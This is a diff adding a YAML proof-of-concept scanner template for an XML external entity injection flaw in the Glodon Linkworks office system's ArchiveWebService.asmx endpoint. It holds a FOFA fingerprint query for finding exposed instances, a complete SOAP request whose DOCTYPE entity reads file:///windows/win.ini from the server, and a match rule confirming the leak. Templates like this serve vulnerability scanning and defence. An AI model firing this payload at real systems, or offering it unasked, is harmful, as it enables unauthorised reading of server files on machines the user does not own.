@@ -1,0 +1,29 @@
+id: poc-yaml-glodon-archivewebservice-asmx-xxe
+info:
+  name: 广联达OA ArchiveWebService.asmx XML实体注入漏洞
+  severity: high
+  tags:
+  - xxe
+  finger: 广联达 Linkworks办公OA
+  fofa: body="Services/Identification/login.ashx"
+requests:
+- method: POST
+  path: /GB/LK/Document/ArchiveService/ArchiveWebService.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: http://GB/LK/Document/ArchiveService/ArchiveWebService.asmx/PostArchiveInfo
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n<soap:Body>\n<PostArchiveInfo xmlns=\"http://GB/LK/Document/ArchiveService/ArchiveWebService.asmx\"\
+    >\n<archiveInfo><!DOCTYPE Archive [\n<!ENTITY secret SYSTEM \"file:///windows/win.ini\"\
+    >\n]>\n\n<Archive>  \n    <ArchiveInfo>  \n        <UploaderID>\n############\n\
+    \n\n&secret;\n\n\n##############\n</UploaderID>  \n    </ArchiveInfo>  \n    <Result>\
+    \  \n        <MainDoc>Document Content</MainDoc>  \n    </Result>  \n    <DocInfo>\
+    \  \n        <DocTypeID>1</DocTypeID>  \n        <DocVersion>1.0</DocVersion>\
+    \  \n    </DocInfo>  \n</Archive></archiveInfo>\n      <folderIdList>string</folderIdList>\n\
+    \      <platId>string</platId>\n      </PostArchiveInfo>\n      </soap:Body>\n\
+    \      </soap:Envelope>"
+  expression: status_code == 500 && contains(body,"[files]") && contains(body,"; for
+    16-bit app support") && contains(content_type,"text/xml")
+variables: {}
+transport: http
